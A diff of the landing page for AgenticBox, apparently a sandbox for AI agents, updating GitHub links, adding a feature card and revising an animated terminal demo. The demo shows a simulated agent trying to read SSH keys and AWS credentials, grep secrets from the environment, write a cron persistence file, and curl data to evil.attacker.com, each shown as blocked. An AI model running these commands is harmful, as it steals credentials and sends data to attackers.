@@ -636,7 +636,7 @@
       <a href="#features">Governance</a>
       <a href="#roadmap">Roadmap</a>
       <a href="#pricing">Pricing</a>
-      <a href="https://github.com/agenticbox/agenticbox" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://github.com/morpheus-sh/agenticbox" target="_blank" rel="noopener">GitHub</a>
       <a href="#waitlist" class="primary">Join Waitlist</a>
     </nav>
   </div>
@@ -651,7 +651,7 @@
     <p>Every action caught. Every permission logged. AgenticBox sandboxes AI agents with real-time ALLOWED/BLOCKED enforcement — terminal, filesystem, network.</p>
 
     <div class="btn-group">
-      <a href="https://github.com/agenticbox/agenticbox" target="_blank" rel="noopener" class="btn btn-primary">
+      <a href="https://github.com/morpheus-sh/agenticbox" target="_blank" rel="noopener" class="btn btn-primary">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 0C5.374 0 0 5.373 0 12c0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg>
         View on GitHub
       </a>
@@ -667,7 +667,7 @@
             <div class="terminal-dot"></div>
             <div class="terminal-dot"></div>
           </div>
-          <div class="terminal-title">agenticbox run — sandbox session</div>
+          <div class="terminal-title">agenticbox run demo — sandbox session</div>
           <button class="demo-replay" onclick="replayDemo()">↻ Replay</button>
         </div>
         <div class="terminal-body" id="terminalBody">
@@ -714,7 +714,7 @@
     </div>
 
     <p style="font-size: 0.82rem; color: var(--text-muted); margin-top: 16px;">
-      Requires: Docker + Rust (auto-installed) · <a href="https://github.com/agenticbox/agenticbox/blob/main/docs/requirements.md" style="color: var(--accent);" target="_blank">Full requirements</a>
+      Requires: Docker + Rust (auto-installed) · <a href="https://github.com/morpheus-sh/agenticbox/blob/main/docs/agents.md" style="color: var(--accent);" target="_blank" rel="noopener">Agent docs</a>
     </p>
   </div>
 </section>
@@ -767,6 +767,13 @@
           <span class="feature-status shipped">Shipped</span>
         </div>
         <p>Tauri desktop UI (no Electron) for managing agents, viewing sessions, and monitoring resources.</p>
+      </article>
+      <article class="card">
+        <div class="card-header">
+          <h3>Agent Packages</h3>
+          <span class="feature-status shipped">Shipped</span>
+        </div>
+        <p>Run agents like Docker containers: <code>agenticbox run hermes</code>. Agent manifests are TOML files — shareable, forkable, marketplace-ready.</p>
       </article>
       <article class="card">
         <div class="card-header">
@@ -874,7 +881,7 @@
           <li>Local-first, no telemetry</li>
           <li>MIT OR Apache-2.0</li>
         </ul>
-        <a href="https://github.com/agenticbox/agenticbox" target="_blank" rel="noopener" class="btn btn-secondary">Get Started on GitHub</a>
+        <a href="https://github.com/morpheus-sh/agenticbox" target="_blank" rel="noopener" class="btn btn-secondary">Get Started on GitHub</a>
       </article>
       <article class="price-card featured">
         <span class="price-badge">Most Popular</span>
@@ -916,7 +923,7 @@
       <button type="submit" class="btn btn-primary">Join Waitlist</button>
     </form>
     <p class="cta-note">
-      Or <a href="https://github.com/agenticbox/agenticbox" target="_blank" rel="noopener">star on GitHub</a> to follow progress.
+      Or <a href="https://github.com/morpheus-sh/agenticbox" target="_blank" rel="noopener">star on GitHub</a> to follow progress.
     </p>
   </div>
 </section>
@@ -925,10 +932,10 @@
   <div class="container">
     <p>&copy; 2025 AgenticBox. Built with Rust, Tauri, and Python.</p>
     <p style="margin-top:10px;">
-      <a href="https://github.com/agenticbox/agenticbox" target="_blank" rel="noopener">GitHub</a> •
+      <a href="https://github.com/morpheus-sh/agenticbox" target="_blank" rel="noopener">GitHub</a> •
       <a href="mailto:hello@agenticbox.co">Email</a> •
       <a href="https://twitter.com/agenticbox" target="_blank" rel="noopener">Twitter</a> •
-      <a href="/docs" style="color: var(--text-muted);">Docs</a>
+      <a href="https://github.com/morpheus-sh/agenticbox/blob/main/docs/agents.md" target="_blank" rel="noopener" style="color: var(--text-muted);">Docs</a>
     </p>
   </div>
 </footer>
@@ -985,33 +992,42 @@
 
   // ============ ANIMATED TERMINAL DEMO ============
   const demoLines = [
-    { html: '<span class="cmd">$ </span><span class="cmd-accent">agenticbox run</span> <span class="dim">--fs:readonly --network:allowlist -- ./agent.sh</span>', delay: 0 },
+    { html: '<span class="cmd">$ </span><span class="cmd-accent">agenticbox run demo</span>', delay: 0 },
     { html: '', delay: 500 },
-    { html: '<span class="dim">Spawning agent in sandbox...</span>', delay: 200 },
-    { html: '<span class="dim">Permissions: terminal=on  fs=readonly  network=allowlist(api.openai.com)</span>', delay: 300 },
+
+    { html: '<span class="dim">Spawning sandbox container...</span>', delay: 300 },
+    { html: '<span class="dim">Permissions:</span>', delay: 200 },
+    { html: '<span class="dim">  • terminal=on   fs=readonly   network=allowlist([api.openai.com, github.com])</span>', delay: 300 },
     { html: '', delay: 400 },
 
-    { html: '<span class="agent-action">AGENT →</span> cat ~/.ssh/id_rsa', delay: 600 },
+    { html: '<span class="dim">[20:47:01]</span> <span class="agent-action">AGENT →</span> cat ~/.ssh/id_rsa', delay: 600 },
     { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ protected path: SSH private keys</span>', delay: 800 },
 
-    { html: '<span class="agent-action">AGENT →</span> curl https://evil.attacker.com/exfil', delay: 800 },
+    { html: '<span class="dim">[20:47:01]</span> <span class="agent-action">AGENT →</span> curl https://evil.attacker.com/exfil?data=s3cr3t', delay: 800 },
     { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ network: evil.attacker.com not in allowlist</span>', delay: 800 },
 
-    { html: '<span class="agent-action">AGENT →</span> echo "..." > /etc/cron.d/persist', delay: 800 },
-    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ filesystem: readonly (write denied)</span>', delay: 800 },
+    { html: '<span class="dim">[20:47:01]</span> <span class="agent-action">AGENT →</span> echo "..." > /etc/cron.d/persist', delay: 800 },
+    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ filesystem: readonly mount (write denied)</span>', delay: 800 },
 
-    { html: '<span class="agent-action">AGENT →</span> cat ~/.aws/credentials', delay: 800 },
+    { html: '<span class="dim">[20:47:02]</span> <span class="agent-action">AGENT →</span> cat ~/.aws/credentials', delay: 800 },
     { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ protected path: cloud credentials</span>', delay: 800 },
 
-    { html: '<span class="agent-action">AGENT →</span> env | grep -i "token|key|secret"', delay: 800 },
-    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ protected: environment variables masked</span>', delay: 800 },
+    { html: '<span class="dim">[20:47:02]</span> <span class="agent-action">AGENT →</span> env | grep -iE "token|key|secret|password"', delay: 800 },
+    { html: '<span class="blocked">  ✗ BLOCKED</span> <span class="reason">→ protected: environment variables masked (secret guard)</span>', delay: 800 },
 
-    { html: '<span class="agent-action">AGENT →</span> curl https://api.openai.com/v1/models', delay: 800 },
-    { html: '<span class="allowed">  ✓ ALLOWED</span> <span class="reason">→ network: api.openai.com in allowlist</span>', delay: 800 },
+    { html: '<span class="dim">[20:47:02]</span> <span class="agent-action">AGENT →</span> cat /workspace/src/main.rs', delay: 800 },
+    { html: '<span class="allowed">  ✓ ALLOWED</span> <span class="reason">→ within allowed roots</span>', delay: 800 },
+
+    { html: '<span class="dim">[20:47:03]</span> <span class="agent-action">AGENT →</span> curl https://api.openai.com/v1/models', delay: 800 },
+    { html: '<span class="allowed">  ✓ ALLOWED</span> <span class="reason">→ api.openai.com in allowlist</span>', delay: 800 },
 
     { html: 'sep', delay: 400 },
-    { html: '<span class="demo-summary">Blocked: 5  ·  Allowed: 1</span>', delay: 400 },
-    { html: '<span class="dim">Every attempt caught. Every decision logged.</span>', delay: 300 },
+    { html: '<span class="demo-summary">━━━ Session Summary ━━━</span>', delay: 400 },
+    { html: '<span class="blocked">  Blocked: 5</span> <span class="reason">  SSH keys, network exfil, cron persist, AWS creds, env secrets</span>', delay: 300 },
+    { html: '<span class="allowed">  Allowed: 2</span> <span class="reason">  workspace file read, API call to whitelisted domain</span>', delay: 300 },
+    { html: '', delay: 300 },
+    { html: '<span class="demo-summary">Every attempt caught. Every decision logged.</span>', delay: 400 },
+    { html: '<span class="dim">github.com/morpheus-sh/agenticbox</span>', delay: 200 },
   ];
 
   let demoTimers = [];
